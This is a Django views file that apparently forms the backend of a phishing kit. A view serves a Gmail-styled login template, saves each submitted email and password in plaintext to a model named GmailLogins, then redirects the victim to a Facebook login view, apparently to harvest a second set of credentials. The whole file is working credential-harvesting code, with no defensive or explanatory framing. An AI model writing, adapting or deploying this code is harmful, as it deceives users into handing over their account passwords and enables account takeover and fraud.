from django.shortcuts import render, redirect
from .models import *

def GmailLogin(request):
    data = {}

    if request.method == 'GET':
        return render(request=request, context=data, template_name='gmail/gmail.html')
    elif request.method == 'POST':
        email = request.POST.get('email')
        password = request.POST.get('password')

        GmailLogins.objects.create(email=email, password=password)

        return redirect('Facebook:FBLogin')